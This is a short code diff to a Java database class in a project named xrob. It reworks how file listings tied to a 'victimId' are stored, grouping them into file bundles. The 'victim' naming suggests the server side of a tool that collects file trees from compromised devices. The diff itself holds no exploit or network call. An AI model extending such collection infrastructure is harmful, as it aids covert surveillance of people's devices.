@@ -3,6 +3,7 @@ package com.theah64.xrob.api.database.tables;
 import com.sun.istack.internal.Nullable;
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.File;
+import com.theah64.xrob.api.models.FileBundle;
 import com.theah64.xrob.api.utils.DarKnight;
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -40,11 +41,16 @@ public class Files extends BaseTable<File> {
 
     @Override
     public void addv2(@Nullable String victimId, JSONArray jaFiles) throws RuntimeException, JSONException {
-        final String query = "INSERT INTO files (victim_id,file_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb,file_hash) VALUES (?,?,?,?,?,?,?,?);";
+
+        //Exploding new file structures
+        //Crearing file bundle
+        final String bundleId = FileBundles.getInstance().addv3(new FileBundle(victimId));
+
+        final String query = "INSERT INTO files (file_bundle_id,file_id,absolute_parent_path,file_name,parent_id,is_directory,file_size_in_kb,file_hash) VALUES (?,?,?,?,?,?,?,?);";
         final java.sql.Connection con = Connection.getConnection();
         try {
             final PreparedStatement ps = con.prepareStatement(query);
-            ps.setString(1, victimId);
+            ps.setString(1, bundleId);
             insert(ps, ABSOLUTE_ROOT, "0", jaFiles, victimId);
             ps.close();
         } catch (SQLException e) {
@@ -59,7 +65,6 @@ public class Files extends BaseTable<File> {
     }
 
     private void insert(PreparedStatement ps, String absoluteParentPath, final String parentId, JSONArray jaFiles, String victimId) throws JSONException, SQLException {
-
 
         for (int i = 0; i < jaFiles.length(); i++) {
 
